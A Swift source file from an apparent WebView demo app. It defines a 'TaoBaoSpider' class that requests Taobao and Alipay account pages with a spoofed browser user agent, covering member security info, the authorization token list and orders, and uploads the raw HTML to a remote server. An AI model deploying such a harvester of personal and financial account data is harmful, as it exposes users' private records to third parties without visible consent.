//
//  TaoBaoSpider.swift
//  WKWebViewDemo
//
//  Created by Alan Ge on 2023/7/8.
//

import Foundation

class TaoBaoSpider {
    
    static let shared = TaoBaoSpider()
    let memberInfoURL = "https://member1.taobao.com/member/fresh/account_security.htm"
    let ordersURL = "https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm"
    let tokenManageURL = "https://openauth.alipay.com/auth/tokenManage.htm"
    /// 绑卡信息
    let bankListURL = "https://zht.alipay.com/asset/bankList.htm"
    
    let myUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    
    //用户信息
    func getMemberInfo() {
        if let url = URL(string: memberInfoURL) {
            var request = URLRequest(url: url)
            request.httpMethod = "GET"
            request.setValue("keep-alive", forHTTPHeaderField: "connection")
            request.setValue("no-cache", forHTTPHeaderField: "pragma")
            request.setValue("no-cache", forHTTPHeaderField: "cache-control")
            request.setValue("*/*", forHTTPHeaderField: "accept")
            request.setValue("XMLHttpRequest", forHTTPHeaderField: "x-requested-with")
            request.setValue(myUA, forHTTPHeaderField: "user-agent")
            request.setValue("zh-CN,zh;q=0.9,en;q=0.8", forHTTPHeaderField: "accept-language")
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                log.info("==========用户信息===========")
                guard let data = data, let _:URLResponse = response, error == nil else {
                    return
                }
                let userInfoString = data.decodeGB18030ToString()
                // 请求到的html传给server
                PostDataDTO.shared.postData(path: "taobao_userinfo", content: userInfoString)
            }
            task.resume()
        }
    }
    // 支付宝授权列表
    func getAccreditDetail(url: URL) {
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("keep-alive", forHTTPHeaderField: "connection")
        request.setValue("no-cache", forHTTPHeaderField: "pragma")
        request.setValue("no-cache", forHTTPHeaderField: "cache-control")
        request.setValue("*/*", forHTTPHeaderField: "accept")
        request.setValue("XMLHttpRequest", forHTTPHeaderField: "x-requested-with")
        request.setValue(myUA, forHTTPHeaderField: "user-agent")
        request.setValue("zh-CN,zh;q=0.9,en;q=0.8", forHTTPHeaderField: "accept-language")
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            log.info("==========授权列表===========")
            guard let data = data, let _:URLResponse = response, error == nil else {
                return
            }
            let orderHtml = data.decodeGB18030ToString()
            // 请求到的html传给server
            PostDataDTO.shared.postData(path: "parse_auth", content: orderHtml)
        }
        task.resume()
    }
    
    //用户信息
    func getOrders(success: @escaping (String?) -> Void) {
        if let url = URL(string: ordersURL) {
            var request = URLRequest(url: url)
            request.httpMethod = "GET"
            request.setValue("keep-alive", forHTTPHeaderField: "connection")
            request.setValue("no-cache", forHTTPHeaderField: "pragma")
            request.setValue("no-cache", forHTTPHeaderField: "cache-control")
            request.setValue("*/*", forHTTPHeaderField: "accept")
            request.setValue("XMLHttpRequest", forHTTPHeaderField: "x-requested-with")
            request.setValue(myUA, forHTTPHeaderField: "user-agent")
            request.setValue("zh-CN,zh;q=0.9,en;q=0.8", forHTTPHeaderField: "accept-language")
            let task = URLSession.shared.dataTask(with: request) { data, response, error in
                guard let data = data, let _:URLResponse = response, error == nil else {
                    success(nil)
                    return
                }
                let orderHtml = data.decodeGB18030ToString()
                // 请求到的html传给server
//                PostDataDTO.shared.postData(path: "taobao_orders", content: orderHtml)
                success(orderHtml)
            }
            task.resume()
        }
    }
    
    func getOrderDetails(url: URL) {
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("keep-alive", forHTTPHeaderField: "connection")
        request.setValue("no-cache", forHTTPHeaderField: "pragma")
        request.setValue("no-cache", forHTTPHeaderField: "cache-control")
        request.setValue("*/*", forHTTPHeaderField: "accept")
        request.setValue("XMLHttpRequest", forHTTPHeaderField: "x-requested-with")
        request.setValue(myUA, forHTTPHeaderField: "user-agent")
        request.setValue("zh-CN,zh;q=0.9,en;q=0.8", forHTTPHeaderField: "accept-language")
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            log.info("==========订单详情===========")
            guard let data = data, let _:URLResponse = response, error == nil else {
                return
            }
            let orderHtml = data.decodeGB18030ToString()
            PostDataDTO.shared.postData(path: "orderDetail", content: orderHtml)
        }
        task.resume()
    }
}

extension Data {
    func decodeGB18030ToString() -> String {
        let cfEncoding = CFStringEncodings.GB_18030_2000
        let encoding = CFStringConvertEncodingToNSStringEncoding(CFStringEncoding(cfEncoding.rawValue))
        if let string = NSString(data: self, encoding: encoding) {
            return string as String
        } else {
            return ""
        }
    }
}

extension Collection {
    // 避免数组越界崩溃
    subscript (safe index: Index) -> Iterator.Element? {
        return indices.contains(index) ? self[index] : nil
    }
}
